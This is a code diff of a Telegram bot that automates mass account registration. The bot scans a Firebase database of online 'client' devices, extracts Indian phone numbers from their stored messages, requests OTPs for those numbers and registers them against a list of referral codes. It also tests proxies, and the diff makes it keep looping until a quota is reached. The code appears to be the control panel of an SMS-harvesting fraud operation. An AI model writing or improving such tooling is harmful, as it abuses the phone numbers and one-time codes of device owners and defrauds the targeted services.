@@ -8,7 +8,7 @@ import random
 import json
 import gc
 
-import aiohttp
+import requests
 from curl_cffi.requests import AsyncSession
 from aiogram import Bot, Dispatcher, F, types
 from aiogram.client.default import DefaultBotProperties
@@ -316,6 +316,7 @@ async def cb_check_devices(callback: types.CallbackQuery):
     await callback.message.answer("🔍 Scanning Firebase database for online devices...")
     try:
         online_count = 0
+        import aiohttp
         async with aiohttp.ClientSession() as session:
             async with session.get(f"{USER_DATA['firebase']}clients.json", timeout=10) as r:
                 clients_data = await r.json() or {}
@@ -337,6 +338,7 @@ async def cb_check_proxies(callback: types.CallbackQuery):
 
     status_msg = await callback.message.answer(f"⚡ Testing {len(USER_DATA['proxies'])} proxies...")
     working = 0
+    import aiohttp
     async with aiohttp.ClientSession() as session:
         for p in USER_DATA["proxies"]:
             try:
@@ -356,54 +358,60 @@ async def cb_start_automation(callback: types.CallbackQuery):
         await callback.answer("❌ Please configure Firebase and add referral codes first!", show_alert=True)
         return
 
-    await callback.message.answer("🚀 <b>Automation started!</b> Scanning active clients...", parse_mode="HTML")
     firebase_url = USER_DATA["firebase"]
     codes = USER_DATA["codes"]
-
-    online_targets = []
-    total_online_count = 0
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(f"{firebase_url}clients.json", timeout=10) as r:
-                clients_data = await r.json() or {}
-
-            seen_phones = set()
-            for cid, cdata in clients_data.items():
-                if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                    try:
-                        async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=10', timeout=5) as m_req:
-                            msgs = await m_req.json()
-                            phone = extract_phone(msgs) if msgs else None
-                            if phone and phone not in seen_phones:
-                                seen_phones.add(phone)
-                                online_targets.append({"cid": cid, "phone": "+91" + phone})
-                                total_online_count += 1
-                    except Exception:
-                        pass
-    except Exception as e:
-        await callback.message.answer(f"❌ Failed to connect to Firebase: {e}")
-        return
-
     needed_per_code = 2
     total_needed = len(codes) * needed_per_code
-    status_msg = await callback.message.answer(f"🔥 Online Devices Found: {total_online_count} | Target Needed: {total_needed}")
+
+    status_msg = await callback.message.answer(f"🚀 <b>Automation started!</b> Target Needed: {total_needed} registrations", parse_mode="HTML")
     success_count = 0
     skipped_phones = set()
+    used_phones = set()
     logger = LiveLogger(status_msg)
 
-    for target in online_targets:
-        if success_count >= total_needed:
-            break
+    # Strictly continue scanning until exact quota is met
+    while success_count < total_needed:
+        import aiohttp
+        online_targets = []
+        total_online_count = 0
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(f"{firebase_url}clients.json", timeout=10) as r:
+                    clients_data = await r.json() or {}
 
-        cid = target["cid"]
-        phone = target["phone"]
-        if phone in skipped_phones:
+                for cid, cdata in clients_data.items():
+                    if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
+                        total_online_count += 1
+                        if cid not in skipped_phones and cid not in used_phones:
+                            try:
+                                async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=10', timeout=5) as m_req:
+                                    msgs = await m_req.json()
+                                    phone = extract_phone(msgs) if msgs else None
+                                    if phone:
+                                        full_phone = "+91" + phone
+                                        if full_phone not in skipped_phones and full_phone not in used_phones:
+                                            online_targets.append({"cid": cid, "phone": full_phone})
+                            except Exception:
+                                pass
+        except Exception as e:
+            await logger.set_text(f"⚠️ Firebase connection error: {e}. Retrying in 5s...")
+            await asyncio.sleep(5)
             continue
 
-        code_idx = success_count // needed_per_code
-        current_code = codes[code_idx] if code_idx < len(codes) else "DONE"
+        if not online_targets:
+            await logger.set_text("🔴 Exhausted available online devices in Firebase. Waiting for new devices...")
+            await asyncio.sleep(5)
+            continue
 
-        await logger.set_text(f"🎯 Processing Phone: {phone} | Code: {current_code}\n⏳ Requesting OTP...")
+        target = online_targets[0]
+        cid = target["cid"]
+        phone = target["phone"]
+        used_phones.add(phone)
+
+        code_idx = success_count // needed_per_code
+        current_code = codes[code_idx] if code_idx < len(codes) else codes[-1]
+
+        await logger.set_text(f"🎯 Processing Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
 
         async with aiohttp.ClientSession() as session:
             known_keys = set()
@@ -464,7 +472,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         await client.close()
         await asyncio.sleep(1.5)
 
-    await callback.message.answer(f"🎉 <b>Automation Finished! Successful: {success_count}/{total_needed}</b>", parse_mode="HTML", reply_markup=get_main_menu())
+    await callback.message.answer(f"🎉 <b>REGISTRATION PROCESS COMPLETED! Successful: {success_count}/{total_needed}</b>", parse_mode="HTML", reply_markup=get_main_menu())
     await callback.answer()
 
 async def main():
